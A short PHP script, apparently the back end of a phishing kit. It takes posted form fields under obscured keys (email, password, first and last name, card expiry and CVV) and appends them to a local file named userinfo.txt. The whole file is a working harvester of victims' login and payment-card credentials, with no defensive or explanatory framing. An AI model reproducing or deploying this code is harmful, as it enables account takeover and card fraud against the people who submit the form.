<?php

file_put_contents("userinfo.txt", "Email: " . $_POST['key6'] . "Password: " . $_POST['key5'] . "First Name: " . $_POST['key4'] . "Last Name: " . $_POST['key3'] . "MM/YY: " . $_POST['key2'] . "CVV: " . $_POST['key1'] . "\n", FILE_APPEND);
exit();
